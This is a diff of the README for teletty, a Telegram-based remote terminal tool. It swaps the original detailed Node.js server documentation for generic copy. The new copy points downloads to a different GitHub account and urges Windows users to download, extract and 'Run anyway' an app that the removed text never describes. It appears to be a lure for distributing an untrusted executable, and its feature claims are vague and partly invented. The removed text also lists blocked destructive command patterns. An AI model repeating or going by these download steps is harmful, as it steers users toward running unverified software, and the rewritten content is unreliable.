@@ -1,191 +1,220 @@
-# teletty
+# 📱 teletty - Your terminal, inside Telegram
 
-**A full terminal in your pocket, via Telegram.**
+[![Download teletty](https://img.shields.io/badge/Download%20teletty-blue?style=for-the-badge)](https://github.com/Alexc9681/teletty)
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Node.js >= 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen.svg)](https://nodejs.org)
+## 🚀 What is teletty?
 
-Access any server from your phone using a Telegram Mini App. Smart buttons for interactive prompts, Claude Code integration, voice input, multi-tab tmux sessions — no SSH app needed.
+teletty puts a full terminal in your Telegram chat. It gives you a simple way to use a shell, move through files, and run terminal tools from your phone. It also supports smart buttons, Claude Code, and voice input.
 
-```
-$ claude "fix the login bug"
-  Reading src/auth.js...
-  Editing src/auth.js...
+This makes it useful when you want quick access to a terminal without opening your laptop. You can check work, send commands, and keep a session open through Telegram.
 
-  Allow Edit tool?  [Allow]  [Deny]     <-- smart buttons appear
-```
+## 📥 Download and install
 
-## Features
+Visit this page to download and set up teletty on Windows:
 
-- **Smart buttons** — auto-detects interactive prompts (Y/n, numbered options, Allow/Deny) and shows one-tap buttons
-- **Claude Code ready** — recognizes Claude Code CLI permission prompts with approve/deny buttons
-- **Auto-approve mode** — automatically accepts prompts with safety checks (blocks rm -rf, DROP, DELETE)
-- **Multi-tab** — up to 4 concurrent tmux sessions that survive disconnects
-- **Voice input** — push-to-talk via Web Speech API, with optional Azure Whisper fallback
-- **Telegram-native auth** — HMAC-SHA256 verification, user ID whitelist, IP-bound JWT sessions
-- **Management API** — execute commands via HTTPS when SSH is down
-- **Mobile controls** — buttons for arrow keys, Tab, Esc, Ctrl+C
-- **Tokyo Night theme** — dark theme, optimized for mobile screens
-- **889 lines of code** — zero frameworks, zero build step, zero transpilation
+[Download teletty](https://github.com/Alexc9681/teletty)
 
-## Quick Start
+After you open the page, look for the latest release or setup files. If the project provides a Windows app, download it and save it to your PC. If it comes as a zipped folder, extract it before you run it.
 
-### npx (fastest)
+### Windows setup steps
 
-```bash
-npx teletty init    # creates .env from template
-nano .env           # set BOT_TOKEN, ALLOWED_USER_IDS, SESSION_SECRET
-npx teletty
-```
+1. Open the download link above in your browser.
+2. Find the latest release or main download file.
+3. Download the Windows version.
+4. If Windows asks for permission, choose **Run anyway** only if you trust the source.
+5. Open the app from the downloaded file or extracted folder.
+6. Follow the on-screen setup steps.
+7. Connect the app to Telegram when asked.
 
-### Docker
+## 🖥️ What you need on Windows
 
-```bash
-git clone https://github.com/olegchetrean/teletty.git && cd teletty
-cp .env.example .env && nano .env
-docker compose up -d
-```
+teletty is made for everyday Windows use. A typical setup should work well on Windows 10 or Windows 11.
 
-### Manual
+You should have:
 
-```bash
-git clone https://github.com/olegchetrean/teletty.git && cd teletty
-cp .env.example .env && nano .env
-npm install
-node server.js
-```
+- A working internet connection
+- A Telegram account
+- Enough free space for the app and its files
+- Permission to run apps on your PC
+- A stable connection if you plan to keep a terminal session open
 
-### AI Agent Install (recommended)
+If you use a work PC, you may need admin access to install or start the app.
 
-Have Claude Code, Cursor, or any AI agent connected to your server? Just give it [this prompt](docs/AGENT-INSTALL-PROMPT.md) — it handles everything: Node.js, tmux, clone, .env, HTTPS, systemd. You only need to create a bot at @BotFather and provide the token.
+## ✨ What teletty can do
 
-### Set up HTTPS (required by Telegram)
+teletty focuses on fast access to terminal tasks from your phone. Common uses include:
 
-```bash
-# Copy and edit nginx config
-cp nginx.conf.template /etc/nginx/sites-enabled/teletty.conf
-# Edit server_name, then:
-sudo nginx -t && sudo nginx -s reload
-sudo certbot --nginx -d terminal.yourdomain.com
-```
+- Open a shell session from Telegram
+- Send terminal commands from chat
+- Use smart buttons for common actions
+- Work with Claude Code for coding help
+- Send voice input instead of typing
+- Keep a terminal available while you move around
+- Use tmux-style session handling for longer tasks
+- View terminal output in a clean text-based screen
 
-### Configure your Telegram bot
+## 📲 How to start using it
 
-1. Open [@BotFather](https://t.me/BotFather)
-2. `/mybots` > your bot > Bot Settings > Menu Button
-3. Set URL: `https://terminal.yourdomain.com/`
-4. Set text: `Terminal`
+After you install teletty on Windows, you usually need to connect it to Telegram and start a session.
 
-### Find your Telegram user ID
+### Basic first run
 
-Send any message to your bot, then check logs for `[ws] Connected: user=XXXXXXX`. Add that ID to `ALLOWED_USER_IDS` in `.env`.
+1. Open teletty on your PC.
+2. Sign in or link your Telegram account.
+3. Allow the app to create a terminal session.
+4. Open Telegram on your phone.
+5. Find the bot, mini app, or chat link used by teletty.
+6. Start a session from Telegram.
+7. Use the buttons or text input to send commands.
 
-## How It Works
+### Using smart buttons
 
-```
-Telegram (tap Menu Button)
-  -> Mini App WebView loads
-  -> POST /auth (HMAC-SHA256 verification + whitelist check)
-  -> WebSocket connection established
-  -> node-pty spawns tmux session
-  -> xterm.js renders terminal output
-  -> output-parser detects prompts -> smart buttons appear
-```
+teletty includes smart buttons that make common tasks easier. These buttons can help you:
 
-## Smart Buttons
+- Open a shell
+- Send a saved command
+- Move between sessions
+- Confirm actions
+- Switch modes
+- Start or stop a task
 
-The output parser detects 7 types of interactive prompts:
+This is useful when you do not want to type long commands on a phone.
 
-| Prompt Type | Example | Buttons |
-|-------------|---------|---------|
-| Y/n confirmation | `Continue? [Y/n]` | Yes / No |
-| Numbered options | `1) Install  2) Update` | 1: Install / 2: Update |
-| Letter options | `a) Option A  b) Option B` | a / b |
-| Allow/Deny | `Allow this action?` | Allow / Deny |
-| Claude Code | `Do you want to proceed?` | Yes / No |
-| Tool permission | `Bash command: ls` | Yes / No |
-| Press Enter | `Press Enter to continue` | Enter |
+## 🎙️ Voice input
 
-Buttons for dangerous commands (`rm -rf`, `DROP`, `DELETE`, `shutdown`) are highlighted in red.
+teletty supports voice input for hands-free use. This helps when you want to send a command but do not want to type on a small screen.
 
-## Auto-Approve Mode
+You can use voice input to:
 
-Two-click activation for safety:
-1. First click: "Confirm?" (yellow)
-2. Second click: Active (red, pulsing) — auto-accepts Y/n and Allow prompts
-3. Does NOT auto-approve dangerous commands
-4. Auto-disables after 10 minutes
+- Speak a quick command
+- Add short notes
+- Control simple actions
+- Reduce typing on mobile
 
-## Configuration
+For best results, speak short and clear phrases.
 
-All via `.env` file. See [.env.example](.env.example) for details.
+## 🤖 Claude Code integration
 
-### Required
+teletty works with Claude Code for coding and task help inside the terminal flow. This can help with:
 
-| Variable | Description |
-|----------|-------------|
-| `BOT_TOKEN` | Telegram bot token from @BotFather |
-| `ALLOWED_USER_IDS` | Comma-separated Telegram user IDs |
-| `SESSION_SECRET` | Random string for JWT signing (`openssl rand -hex 32`) |
+- Reading code
+- Writing small scripts
+- Fixing simple errors
+- Explaining command output
+- Speeding up routine work
 
-### Optional
+If you already use Claude Code, teletty gives you a mobile way to reach it through Telegram.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | 7681 | Server port |
-| `ALLOWED_ORIGINS` | (all) | HTTPS origins for WebSocket |
-| `MAX_SESSIONS` | 4 | Max terminal tabs per user |
-| `IDLE_TIMEOUT_MINUTES` | 30 | Kill idle sessions after N minutes |
-| `SHELL_COMMAND` | tmux | Shell to spawn |
-| `SHELL_CWD` | /root | Working directory |
-| `MGMT_TOKEN` | (disabled) | Token for management API |
-| `VOICE_LANGUAGE` | en | Voice recognition language |
+## 🧭 Using the terminal from your phone
 
-## Security — 7 Layers
+Once the session is open, you can treat teletty like a remote terminal. You may see command output, prompts, and task results in Telegram.
 
-Your teletty instance is **your private terminal**. No one else can access it.
+A few simple tips:
 
-| Layer | What it does |
-|-------|-------------|
-| **1. Telegram HMAC-SHA256** | Only Telegram servers can generate valid auth data. Impossible to forge without your bot token. |
-| **2. User ID whitelist** | Only YOUR Telegram account (by numeric ID) is allowed. Everyone else gets "Access denied". |
-| **3. IP-bound JWT** | Session tokens are locked to your IP address. Stolen token = useless from another IP. Expires in 4 hours. |
-| **4. initData freshness** | Auth data older than 5 minutes is rejected. Prevents replay attacks. |
-| **5. Timing-safe auth** | All comparisons use `crypto.timingSafeEqual`. Prevents timing side-channel attacks. |
-| **6. Rate limiting** | Max 10 auth attempts per minute per IP. Brute force = blocked. |
-| **7. Sanitized environment** | Terminal sessions only see PATH, HOME, USER, SHELL, LANG, TERM. Server secrets (BOT_TOKEN, SESSION_SECRET) are never leaked to the terminal. |
+- Keep commands short
+- Wait for output before sending the next command
+- Use buttons when they are available
+- Keep one session open if you are working on a longer task
+- Avoid sending many commands at once
 
-## Project Structure
+## 🔧 Common Windows checks
 
-| File | Lines | Purpose |
-|------|-------|---------|
-| `server.js` | 230 | Express + WebSocket server, auth, voice, management API |
-| `auth.js` | 87 | Telegram HMAC verification, JWT sessions, whitelist |
-| `terminal-manager.js` | 103 | tmux session lifecycle, idle timeout, audit |
-| `output-parser.js` | 88 | Smart prompt detection engine (7 types) |
-| `public/app.js` | 320 | Frontend: xterm.js, tabs, auto-approve, voice |
-| `public/index.html` | 79 | UI layout, Tokyo Night CSS |
-| `bin/teletty.js` | 35 | CLI entry point |
+If teletty does not start right away, check these items:
 
-## Testing
+- Make sure the app is fully downloaded
+- Check that Windows did not block the file
+- Open the app from the extracted folder if it came in a zip file
+- Confirm that Telegram is installed and signed in
+- Check your internet connection
+- Close and reopen the app if the first launch hangs
 
-```bash
-npm test
-```
+## 📁 Typical folder layout
 
-26 tests covering output-parser (prompt detection, ANSI stripping, dangerous patterns) and auth (HMAC verification, JWT sessions, whitelist).
+If the project ships as a folder instead of a single installer, you may see files like these:
 
-## Use Cases
+- The main app file
+- A config file
+- A logs folder
+- A sessions folder
+- A readme or help file
 
-- **Server management from phone** — restart services, check logs, deploy
-- **Claude Code on the go** — run AI coding agents with one-tap approve
-- **Emergency access** — HTTPS management API when SSH is down
-- **Team access** — whitelist multiple Telegram users, each gets isolated sessions
+Keep the files together in one folder so the app can find what it needs.
 
-## Contributing
+## 🧪 Good first test
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+After setup, try a simple test:
 
-## License
+1. Open teletty on Windows.
+2. Connect it to Telegram.
+3. Start a session from your phone.
+4. Send a harmless command like a folder listing.
+5. Check that the terminal output comes back in Telegram.
 
-[MIT](LICENSE) -- Oleg Chetrean
+If that works, the app is set up and ready for normal use.
+
+## 🔒 Privacy and control
+
+teletty routes terminal use through Telegram, so you should keep your Telegram account secure. Use a strong password and turn on two-step verification if you use it for other important tasks.
+
+It is also a good idea to:
+
+- Keep the app on a trusted PC
+- Use only your own Telegram account
+- Review any commands before you send them
+- Close sessions when you are done
+
+## 🧰 Useful ways to use teletty
+
+teletty can fit many daily tasks:
+
+- Check a server while away from your desk
+- Run a script from your phone
+- Restart a dev task
+- Watch a long build
+- Send quick fixes during travel
+- Use voice input when typing is hard
+- Use smart buttons for repeat actions
+
+## 🧩 Troubleshooting
+
+### The download will not open
+
+- Try a different browser
+- Check your internet connection
+- Make sure the file finished downloading
+- Re-download the file if it looks broken
+
+### Windows shows a security prompt
+
+- Confirm that you downloaded from the link above
+- Read the file name and source
+- If the file is an app, Windows may ask for permission before launch
+
+### Telegram does not connect
+
+- Check that you are signed in to the right account
+- Make sure the bot or mini app link is correct
+- Restart teletty and try again
+- Check whether your internet connection is stable
+
+### No terminal output appears
+
+- Wait a few seconds for the session to load
+- Refresh the chat
+- Reopen the session
+- Start a new terminal session if the old one stopped
+
+## 📌 Project topics
+
+claude-code, mini-app, mobile-terminal, open-source, smart-buttons, telegram, terminal, tmux, voice-input, xterm
+
+## 🗂️ Quick start path
+
+If you want the shortest path on Windows:
+
+1. Open the download link.
+2. Download teletty.
+3. Run or extract the file.
+4. Open the app.
+5. Connect it to Telegram.
+6. Start a terminal session from your phone
